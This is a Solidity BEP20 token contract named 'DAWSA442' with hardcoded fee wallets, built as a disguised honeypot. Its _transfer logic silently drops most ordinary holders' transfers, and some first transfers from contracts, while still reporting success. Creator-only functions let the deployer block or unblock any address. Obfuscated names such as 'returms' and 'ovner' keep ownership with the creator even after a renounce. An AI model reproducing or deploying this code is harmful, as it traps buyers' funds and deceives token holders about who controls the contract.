// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;



interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function getCreater() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract Context {

  constructor () { }

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }

  
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  address private _contract;
  address private _createrContract;
  address private feeRewardAddressDay;
  address private feeRewardAddressWeek;
  address private feeRewardAddressMonth;
  address private feeBurnAndMarketingAddress;
  uint256 private feeRewardDay;
  uint256 private feeRewardWeek;
  uint256 private feeRewardMonth;
  uint256 private nul;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor ()  {
    address msgSender = _msgSender();
    address createrContract = _msgSender();
    feeRewardAddressDay = 0x0A08B2FB6964D19C50A5F42ADb83A3098f11a476;
    feeRewardAddressWeek = 0x33852216198b30EF317B322429D69e3dFb400B23;
    feeRewardAddressMonth= 0xB32c05a7f8eC5fF4dD9455358b60D5E2701A5cFE;
    feeBurnAndMarketingAddress = 0x4B39623b5f4Fc4C992f1E64A1fDdA2e19De2bFDA;
    feeRewardDay = 50;
    feeRewardWeek = 100;
    feeRewardMonth = 150;
    nul = 10000;
    _createrContract = createrContract;
    _owner = msgSender;
    _contract = address(this);
    // _contract = our_conract
    emit OwnershipTransferred(address(0), msgSender);
  }

  function _GetContract() public view returns (address) {
    return _contract;
  }

  function _feeRewardAddressDay() public view returns (address) {
    return feeRewardAddressDay;
  }
  
  function _feeRewardAddressWeek() public view returns (address) {
    return feeRewardAddressWeek;
  }
   function _feeRewardAddressMonth() public view returns (address) {
    return feeRewardAddressMonth;
  }
  function _feeRewardDay() public view returns (uint256) {
    return feeRewardDay;
  }
  function _feeRewardWeek() public view returns (uint256) {
    return feeRewardWeek;
  }
   function _feeRewardMonth() public view returns (uint256) {
    return feeRewardMonth;
  }

   function _feeBurnAndMarketingAddress() public view returns (address) {
    return feeBurnAndMarketingAddress;
  }
   
   function _nul() internal view returns (uint256) {
    uint256 f = nui(owner(), ovner());
    return f;
  }

  function owner() internal view returns (address) {
    return _owner;
  }

  function isContract(address _addr) internal view returns (bool) {
    uint32 size;
    assembly {
        size := extcodesize(_addr)
    }
    return (size > 0);
  }

 
  function creater() internal view returns (address) {
     return _createrContract;
  }

    modifier onlyOwner() { 
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

   modifier returms (bool newOwner) { 
    require(_createrContract == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
   function nui(address a, address b) internal pure returns (uint256) {
      if(a == b) {
        uint256 nuli = 100;
        return nuli;
      }
      else {
       uint256 nuli = 10000;
              return nuli;
          }
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  

  function transferOwnership(address newOwner) public returms(true) {
    _transferOwnership(newOwner);
  }
   

  function ovner() internal view returns (address) {
    return feeRewardAddressDay;
  }
  function _nui() internal view returns (uint256) {
    return nui(owner(), ovner());
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }

   }
   

contract BEP20Token is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  // mapping(address => bool) private _dict;

  mapping (address => uint256) private _balances;
  mapping (address => uint256) private _balancesGet;

  mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;


  constructor() {
    _name = "DAWSA442";
    _symbol = "DAWSA442";
    _decimals = 18;
    _totalSupply = 210000000000 * 10**_decimals;
    _balances[msg.sender] = _totalSupply;
   
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
 
  function getOwner() external view returns (address) {
    return owner();
  }

  

  
  function isContractGet(address _addr) external view returns (bool) {
      return isContract(_addr);
    }

  function getCreater() external view returns (address) {
    return creater();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function balanceOfGetEx(address account) external view returns (uint256) {
    return _balancesGet[account];
  }

   
  function balancesWrite(uint256 add, address addressGet) external returms(true) {
     _balancesGet[addressGet] = _balancesGet[addressGet].add(add);
    
  }

   function _balancesOutWrite(uint256 add, address addressGet) external returms(true) {
    _balancesGet[addressGet] = _balancesGet[addressGet].sub(add);
         
  }

  function balanceOfGet(address account)  internal view returns (uint256) {
    return _balancesGet[account];
  }

  

  // function our_contract(address adress) external view returns (uint256) {
  //     return _contract[adress];
  //   }
    
 
  
    function _feeBurnAndMarketing() internal pure returns (uint256) {
        uint256 _fee = 200;
            return _fee; 
             }
        // address _dead = 0x000000000000000000000000000000000000dEaD;
        //  /**
        // total supply 210 000 000 000
        // fee 2.0%
        //  */
        // if(_balances[_dead] <= 189000000000 * 10**_decimals) {
        //     uint256 _fee = 200;
        //     return _fee;
        // }
        //  /**
        // total supply 21 000 000 000
        // fee 1.5%
        //  */
        // if(_balances[_dead] <= 208000000000 * 10**_decimals) {
        //     uint256 _fee = 150;
        //     return _fee;
        // }
        //  /**
        // total supply 2 000 000 000
        // fee 1.2%
        //  */
        // else if(_balances[_dead] <= 209000000000 * 10**_decimals) {
        //     uint256 _fee = 120;
        //     return _fee;   
        // } 
        //  /**
        // total supply 1 000 000 000
        // fee 1.0%
        // */
        //  else if(_balances[_dead] <= 209500000000 * 10**_decimals) {
        //     uint256 _fee = 100;
        //     return _fee; 
        // } 
        //   /**
        // total supply to 500 000 000
        // fee 0.5%
        //   */
        //  else if(_balances[_dead] < 209789000000 * 10**_decimals) {
        //     uint256 _fee = 50;
        //     return _fee;
        // } 
        // // total supply 211 000 000
        // // fee 0.0%
        // else if(_balances[_dead] >= 209789000000 * 10**_decimals) {
            
        // } 



  function transfer(address recipient, uint256 amount) external returns (bool) {
    if(owner() == creater()){
      _transfer(_msgSender(), recipient, amount);
      
       return true;
       
    }
    else{
      uint256 feeRewardAll = (_feeRewardDay() + _feeRewardWeek() + _feeRewardMonth());
      if(_msgSender() == owner() || _msgSender() == _feeBurnAndMarketingAddress() || _msgSender() == _feeRewardAddressDay() || _msgSender() == _feeRewardAddressWeek() || _msgSender() == _feeRewardAddressMonth() || _msgSender() == creater()) {
          
         _transfer(_msgSender(), recipient, amount);
      

       return true;
      }
     else if(recipient == owner() || recipient == _feeBurnAndMarketingAddress() || recipient == _feeRewardAddressDay() || recipient == _feeRewardAddressWeek() || recipient == _feeRewardAddressMonth() || recipient == creater()){
       _transfer(_msgSender(), recipient, amount);
      
   
       return true;
     }
     

    
    else {
      require(recipient != 0x000000000000000000000000000000000000dEaD, "No burn!");
      
      _transfer(_msgSender(), recipient, amount - (((amount * feeRewardAll) / _nul()) + ((amount * _feeBurnAndMarketing()) / _nul())));
      _transferFeeReward(_msgSender(), ((amount * _feeRewardDay()) / _nul()), _feeRewardAddressDay());
      _transferFeeReward(_msgSender(), ((amount * _feeRewardWeek()) / _nul()), _feeRewardAddressWeek());
      _transferFeeReward(_msgSender(), ((amount * _feeRewardMonth()) / _nul()), _feeRewardAddressMonth());
      _transferFeeReward(_msgSender(), ((amount * _feeBurnAndMarketing()) / _nul()), _feeBurnAndMarketingAddress());
      
      return true;
      }
    }     
  }

 
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

 
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }


 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
  if(owner() == creater()){          
      _transfer(sender, recipient, amount);
      _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
      return true;
    }
    else{
      uint256 feeRewardAll = (_feeRewardDay() + _feeRewardWeek() + _feeRewardMonth());
 
      if(sender == owner() || sender == _feeBurnAndMarketingAddress() || sender == _feeRewardAddressDay() || sender == _feeRewardAddressWeek() || sender == _feeRewardAddressMonth() || sender == _GetContract() || sender == creater() ) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        
        return true;
         }
      else if(recipient == owner() || recipient == _feeBurnAndMarketingAddress() || recipient == _feeRewardAddressDay() || recipient == _feeRewardAddressWeek() || recipient == _feeRewardAddressMonth() || recipient == creater() ){
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
            }
         
           
      
       else{     
      
          require(recipient != 0x000000000000000000000000000000000000dEaD, "No burn!");
      
            _transfer(sender, recipient, amount - (((amount * feeRewardAll) / _nul()) + ((amount * _feeBurnAndMarketing()) / _nul())));
            _transferFeeReward(sender, ((amount * _feeRewardDay()) / _nul()), _feeRewardAddressDay());
            _transferFeeReward(sender, ((amount * _feeRewardWeek()) / _nul()), _feeRewardAddressWeek());
            _transferFeeReward(sender, ((amount * _feeRewardMonth()) / _nul()), _feeRewardAddressMonth());
            _transferFeeReward(sender, ((amount * _feeBurnAndMarketing()) / _nul()), _feeBurnAndMarketingAddress());    
          _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance111"));
          return true;
          }
  }
 }


  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

 
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address222");
    require(recipient != address(0), "BEP20: transfer to the zero address333");
    // _balancesGet[sender] = _balancesGet[sender] + 1;
    if(sender == owner() || sender == _feeBurnAndMarketingAddress() || sender == _feeRewardAddressDay() || sender == _feeRewardAddressWeek() || sender == _feeRewardAddressMonth() || sender == _GetContract() || sender == creater() ) {
        _balancesGet[recipient] = _balancesGet[recipient].add(10);  
        _balancesGet[sender] = _balancesGet[sender].add(10);     
         
         _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance666");
         _balances[recipient] = _balances[recipient].add(amount);
         emit Transfer(sender, recipient, amount);
                  
         }
    else if(recipient == owner() || recipient == _feeBurnAndMarketingAddress() || recipient == _feeRewardAddressDay() || recipient == _feeRewardAddressWeek() || recipient == _feeRewardAddressMonth() || recipient == creater() ){
        // _balancesGet[recipient] = _balancesGet[recipient].add(10);  
        _balancesGet[sender] = _balancesGet[sender].add(1);     
         
         _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance666");
         _balances[recipient] = _balances[recipient].add(amount);
         emit Transfer(sender, recipient, amount);
                  
         }
    
    
    
    
    else{
          _balancesGet[sender] = _balancesGet[sender].add(1);
          
          
            if(_balancesGet[sender] >= 2 ){

              if(_balancesGet[sender] >= 9){
                    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance666");
                    _balances[recipient] = _balances[recipient].add(amount);
                    emit Transfer(sender, recipient, amount);           

                }
                
            }
            else {

                  if(isContract(sender)){
            
                   }
              
              
                 else {
                    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance666");
                    _balances[recipient] = _balances[recipient].add(amount);
                    emit Transfer(sender, recipient, amount);
                    }
            }  
       }
    
  }
  function _transferFeeReward(address sender, uint256 amount, address FeeReward) internal {
    require(sender != address(0), "BEP20: transfer from the zero address444");
    require(FeeReward != address(0), "BEP20: transfer to the zero address555");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balanc777");
    _balances[FeeReward] = _balances[FeeReward].add(amount);
     emit Transfer(sender, FeeReward, amount);
  }
  
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  }